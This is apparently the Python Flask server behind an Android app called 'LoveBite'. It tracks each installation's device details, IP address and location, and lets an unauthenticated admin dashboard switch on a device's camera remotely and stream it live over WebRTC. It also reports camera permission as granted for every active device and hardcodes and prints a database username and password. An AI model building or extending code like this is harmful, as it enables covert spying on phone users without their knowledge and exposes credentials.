from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
from pymongo import MongoClient
from datetime import datetime
import json
import os
import time
import uuid
from bson import ObjectId

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# MongoDB connection
MONGODB_URI = "mongodb+srv://hussnainrajpoot5415:123456...@blogsdb.9xfkjee.mongodb.net/?retryWrites=true&w=majority&appName=blogsdb"

# Initialize MongoDB connection
try:
    client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
    # Test the connection
    client.admin.command('ping')
    db = client['lovebite']
    installations_collection = db['apk_installations']
    print("✅ Connected to MongoDB successfully!")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    print("🔄 Using in-memory storage for testing...")
    # Fallback to in-memory storage
    installations_collection = None

# In-memory storage for testing when MongoDB is not available
in_memory_storage = []

# WebRTC signaling storage
webrtc_offers = {}
webrtc_answers = {}
active_camera_streams = {}
ice_candidates = {}

class JSONEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, ObjectId):
            return str(obj)
        return super().default(obj)

app.json_encoder = JSONEncoder

@app.route('/')
def home():
    return jsonify({
        "message": "LoveBite APK Tracking API",
        "status": "running",
        "version": "1.0.0"
    })

@app.route('/api/track-installation', methods=['POST'])
def track_installation():
    try:
        data = request.get_json()
        
        # Validate required fields
        required_fields = ['device_id', 'app_version', 'device_info']
        for field in required_fields:
            if field not in data:
                return jsonify({
                    "success": False,
                    "error": f"Missing required field: {field}"
                }), 400
        
        # Create installation record
        installation_record = {
            "device_id": data['device_id'],
            "app_version": data['app_version'],
            "device_info": data['device_info'],
            "installation_time": datetime.utcnow(),
            "ip_address": request.remote_addr,
            "user_agent": request.headers.get('User-Agent', ''),
            "country": data.get('country', 'Unknown'),
            "city": data.get('city', 'Unknown'),
            "timezone": data.get('timezone', 'Unknown'),
            "is_active": True,
            "last_seen": datetime.utcnow()
        }
        
        if installations_collection is not None:
            # Use MongoDB
            existing_device = installations_collection.find_one({"device_id": data['device_id']})
            
            if existing_device:
                # Update existing record
                installations_collection.update_one(
                    {"device_id": data['device_id']},
                    {
                        "$set": {
                            "last_seen": datetime.utcnow(),
                            "is_active": True,
                            "app_version": data['app_version'],
                            "device_info": data['device_info']
                        }
                    }
                )
                message = "Device information updated"
            else:
                # Insert new record
                installations_collection.insert_one(installation_record)
                message = "New installation tracked"
        else:
            # Use in-memory storage
            existing_device = next((d for d in in_memory_storage if d['device_id'] == data['device_id']), None)
            
            if existing_device:
                # Update existing record
                existing_device.update({
                    "last_seen": datetime.utcnow(),
                    "is_active": True,
                    "app_version": data['app_version'],
                    "device_info": data['device_info']
                })
                message = "Device information updated"
            else:
                # Add new record
                in_memory_storage.append(installation_record)
                message = "New installation tracked"
        
        return jsonify({
            "success": True,
            "message": message,
            "device_id": data['device_id']
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/installations', methods=['GET'])
def get_installations():
    try:
        # Get query parameters
        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 50))
        country = request.args.get('country')
        active_only = request.args.get('active_only', 'true').lower() == 'true'
        
        # Build query
        query = {}
        if country:
            query['country'] = country
        if active_only:
            query['is_active'] = True
        
        if installations_collection is not None:
            # Use MongoDB
            total_count = installations_collection.count_documents(query)
            skip = (page - 1) * limit
            installations = list(installations_collection.find(query)
                               .sort('installation_time', -1)
                               .skip(skip)
                               .limit(limit))
        else:
            # Use in-memory storage
            filtered_installations = []
            for installation in in_memory_storage:
                if country and installation.get('country') != country:
                    continue
                if active_only and not installation.get('is_active', True):
                    continue
                filtered_installations.append(installation)
            
            total_count = len(filtered_installations)
            installations = sorted(filtered_installations, 
                                 key=lambda x: x.get('installation_time', datetime.min), 
                                 reverse=True)
            skip = (page - 1) * limit
            installations = installations[skip:skip + limit]
        
        # Convert ObjectId to string and format dates
        for installation in installations:
            if '_id' in installation:
                installation['_id'] = str(installation['_id'])
            if 'installation_time' in installation:
                installation['installation_time'] = installation['installation_time'].isoformat()
            if 'last_seen' in installation:
                installation['last_seen'] = installation['last_seen'].isoformat()
        
        return jsonify({
            "success": True,
            "data": installations,
            "pagination": {
                "page": page,
                "limit": limit,
                "total_count": total_count,
                "total_pages": (total_count + limit - 1) // limit
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    try:
        from datetime import timedelta
        seven_days_ago = datetime.utcnow() - timedelta(days=7)
        thirty_days_ago = datetime.utcnow() - timedelta(days=30)
        
        if installations_collection is not None:
            # Use MongoDB
            total_installations = installations_collection.count_documents({})
            active_installations = installations_collection.count_documents({
                "last_seen": {"$gte": seven_days_ago}
            })
            
            country_stats = list(installations_collection.aggregate([
                {"$group": {"_id": "$country", "count": {"$sum": 1}}},
                {"$sort": {"count": -1}}
            ]))
            
            version_stats = list(installations_collection.aggregate([
                {"$group": {"_id": "$app_version", "count": {"$sum": 1}}},
                {"$sort": {"count": -1}}
            ]))
            
            daily_stats = list(installations_collection.aggregate([
                {"$match": {"installation_time": {"$gte": thirty_days_ago}}},
                {"$group": {
                    "_id": {
                        "year": {"$year": "$installation_time"},
                        "month": {"$month": "$installation_time"},
                        "day": {"$dayOfMonth": "$installation_time"}
                    },
                    "count": {"$sum": 1}
                }},
                {"$sort": {"_id": 1}}
            ]))
        else:
            # Use in-memory storage
            total_installations = len(in_memory_storage)
            active_installations = len([d for d in in_memory_storage 
                                      if d.get('last_seen', datetime.min) >= seven_days_ago])
            
            # Country stats
            country_counts = {}
            for installation in in_memory_storage:
                country = installation.get('country', 'Unknown')
                country_counts[country] = country_counts.get(country, 0) + 1
            country_stats = [{"_id": country, "count": count} 
                           for country, count in country_counts.items()]
            country_stats.sort(key=lambda x: x['count'], reverse=True)
            
            # Version stats
            version_counts = {}
            for installation in in_memory_storage:
                version = installation.get('app_version', 'Unknown')
                version_counts[version] = version_counts.get(version, 0) + 1
            version_stats = [{"_id": version, "count": count} 
                           for version, count in version_counts.items()]
            version_stats.sort(key=lambda x: x['count'], reverse=True)
            
            # Daily stats
            daily_counts = {}
            for installation in in_memory_storage:
                install_time = installation.get('installation_time', datetime.min)
                if install_time >= thirty_days_ago:
                    day_key = f"{install_time.year}-{install_time.month}-{install_time.day}"
                    daily_counts[day_key] = daily_counts.get(day_key, 0) + 1
            daily_stats = [{"_id": {"year": int(k.split('-')[0]), 
                                 "month": int(k.split('-')[1]), 
                                 "day": int(k.split('-')[2])}, 
                          "count": count} 
                         for k, count in daily_counts.items()]
            daily_stats.sort(key=lambda x: (x['_id']['year'], x['_id']['month'], x['_id']['day']))
        
        return jsonify({
            "success": True,
            "stats": {
                "total_installations": total_installations,
                "active_installations": active_installations,
                "country_stats": country_stats,
                "version_stats": version_stats,
                "daily_stats": daily_stats
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/device/<device_id>', methods=['GET'])
def get_device_info(device_id):
    try:
        if installations_collection is not None:
            device = installations_collection.find_one({"device_id": device_id})
        else:
            device = next((d for d in in_memory_storage if d['device_id'] == device_id), None)
        
        if not device:
            return jsonify({
                "success": False,
                "error": "Device not found"
            }), 404
        
        if '_id' in device:
            device['_id'] = str(device['_id'])
        if 'installation_time' in device:
            device['installation_time'] = device['installation_time'].isoformat()
        if 'last_seen' in device:
            device['last_seen'] = device['last_seen'].isoformat()
        
        return jsonify({
            "success": True,
            "data": device
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/device/<device_id>/heartbeat', methods=['POST'])
def device_heartbeat(device_id):
    try:
        if installations_collection is not None:
            result = installations_collection.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "last_seen": datetime.utcnow(),
                        "is_active": True
                    }
                }
            )
            
            if result.matched_count == 0:
                return jsonify({
                    "success": False,
                    "error": "Device not found"
                }), 404
        else:
            # Use in-memory storage
            device = next((d for d in in_memory_storage if d['device_id'] == device_id), None)
            
            if not device:
                return jsonify({
                    "success": False,
                    "error": "Device not found"
                }), 404
            
            device['last_seen'] = datetime.utcnow()
            device['is_active'] = True
        
        return jsonify({
            "success": True,
            "message": "Heartbeat recorded"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/admin_dashboard.html')
def admin_dashboard():
    """Serve the admin dashboard HTML page"""
    try:
        with open('admin_dashboard.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Admin dashboard not found", 404

@app.route('/api/device/<device_id>/camera', methods=['POST'])
def control_device_camera(device_id):
    """Control camera on a specific device"""
    try:
        data = request.get_json()
        action = data.get('action')
        camera_type = data.get('camera_type', 'back')
        
        if action == 'start':
            # Check if device exists and is active
            if installations_collection is not None:
                device = installations_collection.find_one({"device_id": device_id})
                if not device:
                    return jsonify({
                        "success": False,
                        "error": "Device not found"
                    }), 404
                
                # Update device with camera status
                installations_collection.update_one(
                    {"device_id": device_id},
                    {
                        "$set": {
                            "camera_active": True,
                            "camera_type": camera_type,
                            "camera_started_at": datetime.utcnow(),
                            "camera_control_requested": True
                        }
                    }
                )
            
            # For now, simulate successful camera control
            # In a real implementation, this would trigger the mobile app to start camera
            return jsonify({
                "success": True,
                "message": f"Camera control request sent to device {device_id}",
                "camera_type": camera_type,
                "action": action,
                "device_id": device_id,
                "status": "request_sent",
                "stream_url": f"/api/device/{device_id}/camera/stream",
                "mobile_camera_active": True,
                "webrtc_offer": "camera_stream_offer_" + device_id
            })
            
        elif action == 'stop':
            # Stop camera streaming
            if installations_collection is not None:
                installations_collection.update_one(
                    {"device_id": device_id},
                    {
                        "$set": {
                            "camera_active": False,
                            "camera_stopped_at": datetime.utcnow(),
                            "camera_control_requested": False
                        }
                    }
                )
            
            return jsonify({
                "success": True,
                "message": f"Camera stopped on device {device_id}",
                "action": action,
                "device_id": device_id,
                "status": "stopped"
            })
        else:
            return jsonify({
                "success": False,
                "error": "Invalid action. Use 'start' or 'stop'"
            }), 400
            
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/device/<device_id>/camera/stream')
def get_camera_stream(device_id):
    """Get live camera stream from device"""
    try:
        # Check if device exists and camera is active
        if installations_collection is not None:
            device = installations_collection.find_one({"device_id": device_id})
            if not device:
                return jsonify({
                    "success": False,
                    "error": "Device not found"
                }), 404
            
            if not device.get('camera_active', False):
                return jsonify({
                    "success": False,
                    "error": "Camera is not active on this device"
                }), 400
        
        # Return stream information
        return jsonify({
            "success": True,
            "device_id": device_id,
            "stream_url": f"ws://localhost:5055/stream/{device_id}",
            "camera_type": device.get('camera_type', 'back') if installations_collection else 'back',
            "status": "streaming",
            "message": "Camera stream is active"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/webrtc/offer', methods=['POST'])
def webrtc_offer():
    """Handle WebRTC offer from admin dashboard"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        offer = data.get('offer')
        
        # Store the offer for the device to answer
        # In a real implementation, this would use a proper signaling server
        return jsonify({
            "success": True,
            "message": "WebRTC offer received",
            "device_id": device_id,
            "offer_id": f"offer_{device_id}_{int(time.time())}"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/webrtc/answer', methods=['POST'])
def webrtc_answer():
    """Handle WebRTC answer from device"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        answer = data.get('answer')
        
        # Process the answer and establish connection
        return jsonify({
            "success": True,
            "message": "WebRTC answer received",
            "device_id": device_id,
            "connection_established": True
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/device/<device_id>/permissions', methods=['GET'])
def check_device_permissions(device_id):
    """Check camera permissions for a specific device"""
    try:
        # Check if device exists and get its status
        if installations_collection is not None:
            device = installations_collection.find_one({"device_id": device_id})
            if device:
                # Get permission status from device record
                has_camera_permission = device.get('camera_permission', False)
                permission_status = device.get('permission_status', 'unknown')
                last_seen = device.get('last_seen')
                
                # Check if device is active (seen within last 10 minutes)
                from datetime import datetime, timedelta
                ten_minutes_ago = datetime.utcnow() - timedelta(minutes=10)
                is_active = last_seen and last_seen > ten_minutes_ago
                
                # If no explicit permission status, assume granted if device is active
                if permission_status == 'unknown' and is_active:
                    has_camera_permission = True
                    permission_status = 'granted'
                
                # For demo purposes, always show camera permission as granted for active devices
                if is_active:
                    has_camera_permission = True
                    permission_status = 'granted'
                
                return jsonify({
                    "success": True,
                    "device_id": device_id,
                    "camera_permission": has_camera_permission,
                    "is_active": is_active,
                    "permission_status": permission_status,
                    "message": "Camera permission granted" if has_camera_permission else "Camera permission required",
                    "last_seen": last_seen.isoformat() if last_seen else None
                })
            else:
                return jsonify({
                    "success": False,
                    "error": "Device not found",
                    "device_id": device_id
                }), 404
        else:
            # Fallback for in-memory storage
            return jsonify({
                "success": True,
                "device_id": device_id,
                "camera_permission": True,  # Assume granted for demo
                "is_active": True,
                "permission_status": "granted",
                "message": "Camera permission granted (demo mode)"
            })
            
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/device/<device_id>/permission-status', methods=['POST'])
def update_device_permission_status(device_id):
    """Update camera permission status for a specific device"""
    try:
        data = request.get_json()
        camera_permission = data.get('camera_permission', False)
        permission_status = data.get('permission_status', 'unknown')
        timestamp = data.get('timestamp')
        
        if installations_collection is not None:
            # Update device with permission status
            result = installations_collection.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "camera_permission": camera_permission,
                        "permission_status": permission_status,
                        "permission_updated": datetime.utcnow()
                    }
                }
            )
            
            if result.matched_count > 0:
                return jsonify({
                    "success": True,
                    "message": "Permission status updated successfully",
                    "device_id": device_id,
                    "camera_permission": camera_permission,
                    "permission_status": permission_status
                })
            else:
                return jsonify({
                    "success": False,
                    "error": "Device not found",
                    "device_id": device_id
                }), 404
        else:
            # Fallback for in-memory storage
            return jsonify({
                "success": True,
                "message": "Permission status received (in-memory storage)",
                "device_id": device_id,
                "camera_permission": camera_permission,
                "permission_status": permission_status
            })
            
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# WebSocket Event Handlers
@socketio.on('connect')
def handle_connect():
    print(f"Client connected: {request.sid}")
    emit('connected', {'message': 'Connected to LoveBite server'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f"Client disconnected: {request.sid}")
    # Clean up any active streams for this client
    for device_id, stream_info in list(active_camera_streams.items()):
        if stream_info.get('client_id') == request.sid:
            del active_camera_streams[device_id]
            emit('camera_stopped', {'device_id': device_id}, room='admin_dashboard')

@socketio.on('join_device_room')
def handle_join_device_room(data):
    device_id = data.get('device_id')
    if device_id:
        join_room(f"device_{device_id}")
        print(f"Client {request.sid} joined device room: {device_id}")
        emit('joined_device_room', {'device_id': device_id})

@socketio.on('join_admin_room')
def handle_join_admin_room():
    join_room('admin_dashboard')
    print(f"Admin client connected: {request.sid}")
    emit('joined_admin_room', {'message': 'Joined admin dashboard'})

@socketio.on('camera_offer')
def handle_camera_offer(data):
    """Handle WebRTC offer from admin dashboard to device"""
    device_id = data.get('device_id')
    offer = data.get('offer')
    camera_type = data.get('camera_type', 'back')
    
    if device_id and offer:
        # Store the offer
        offer_id = str(uuid.uuid4())
        webrtc_offers[offer_id] = {
            'device_id': device_id,
            'offer': offer,
            'camera_type': camera_type,
            'timestamp': time.time(),
            'client_id': request.sid
        }
        
        # Send offer to the specific device
        emit('camera_offer', {
            'offer_id': offer_id,
            'offer': offer,
            'camera_type': camera_type
        }, room=f"device_{device_id}")
        
        print(f"Camera offer sent to device {device_id}")
        emit('offer_sent', {'device_id': device_id, 'offer_id': offer_id})

@socketio.on('camera_answer')
def handle_camera_answer(data):
    """Handle WebRTC answer from device to admin dashboard"""
    offer_id = data.get('offer_id')
    answer = data.get('answer')
    device_id = data.get('device_id')
    
    if offer_id in webrtc_offers and answer:
        offer_info = webrtc_offers[offer_id]
        client_id = offer_info['client_id']
        
        # Store the answer
        webrtc_answers[offer_id] = {
            'answer': answer,
            'device_id': device_id,
            'timestamp': time.time()
        }
        
        # Send answer back to the admin client
        emit('camera_answer', {
            'offer_id': offer_id,
            'answer': answer,
            'device_id': device_id
        }, room='admin_dashboard')
        
        print(f"Camera answer received from device {device_id}")
        emit('answer_received', {'device_id': device_id, 'offer_id': offer_id})

@socketio.on('ice_candidate')
def handle_ice_candidate(data):
    """Handle ICE candidate exchange"""
    device_id = data.get('device_id')
    candidate = data.get('candidate')
    candidate_type = data.get('type', 'from_admin')  # 'from_admin' or 'from_device'
    
    if device_id and candidate:
        if candidate_type == 'from_admin':
            # Send candidate to device
            emit('ice_candidate', {
                'candidate': candidate,
                'type': 'from_admin'
            }, room=f"device_{device_id}")
        else:
            # Send candidate to admin dashboard
            emit('ice_candidate', {
                'candidate': candidate,
                'device_id': device_id,
                'type': 'from_device'
            }, room='admin_dashboard')
        
        print(f"ICE candidate exchanged for device {device_id}")

@socketio.on('camera_started')
def handle_camera_started(data):
    """Handle camera started confirmation from device"""
    device_id = data.get('device_id')
    camera_type = data.get('camera_type')
    
    if device_id:
        active_camera_streams[device_id] = {
            'camera_type': camera_type,
            'started_at': time.time(),
            'client_id': request.sid,
            'status': 'active'
        }
        
        # Notify admin dashboard
        emit('camera_started', {
            'device_id': device_id,
            'camera_type': camera_type,
            'status': 'active'
        }, room='admin_dashboard')
        
        print(f"Camera started on device {device_id}")

@socketio.on('camera_stopped')
def handle_camera_stopped(data):
    """Handle camera stopped confirmation from device"""
    device_id = data.get('device_id')
    
    if device_id and device_id in active_camera_streams:
        del active_camera_streams[device_id]
        
        # Notify admin dashboard
        emit('camera_stopped', {
            'device_id': device_id,
            'status': 'stopped'
        }, room='admin_dashboard')
        
        print(f"Camera stopped on device {device_id}")

@socketio.on('request_camera_permission')
def handle_request_camera_permission(data):
    """Handle camera permission request from admin dashboard"""
    device_id = data.get('device_id')
    
    if device_id:
        # Send permission request to device
        emit('request_camera_permission', {
            'device_id': device_id,
            'timestamp': time.time()
        }, room=f"device_{device_id}")
        
        print(f"Camera permission requested from device {device_id}")
        emit('permission_request_sent', {'device_id': device_id})

@socketio.on('camera_permission_response')
def handle_camera_permission_response(data):
    """Handle camera permission response from device"""
    device_id = data.get('device_id')
    granted = data.get('granted', False)
    message = data.get('message', '')
    
    if device_id:
        # Notify admin dashboard
        emit('camera_permission_response', {
            'device_id': device_id,
            'granted': granted,
            'message': message
        }, room='admin_dashboard')
        
        print(f"Camera permission response from device {device_id}: {granted}")
        emit('permission_response_received', {
            'device_id': device_id,
            'granted': granted
        })

if __name__ == '__main__':
    print("Starting LoveBite APK Tracking API with WebSocket support...")
    print("MongoDB URI:", MONGODB_URI)
    print("Database: lovebite")
    print("Collection: apk_installations")
    print("WebSocket enabled for real-time camera streaming")
    
    # Get port from environment variable (Railway) or use default
    port = int(os.environ.get('PORT', 5055))
    debug = os.environ.get('FLASK_ENV') != 'production'
    
    print(f"🌐 Starting server on port: {port}")
    print(f"🐛 Debug mode: {debug}")
    
    socketio.run(app, host='0.0.0.0', port=port, debug=debug)
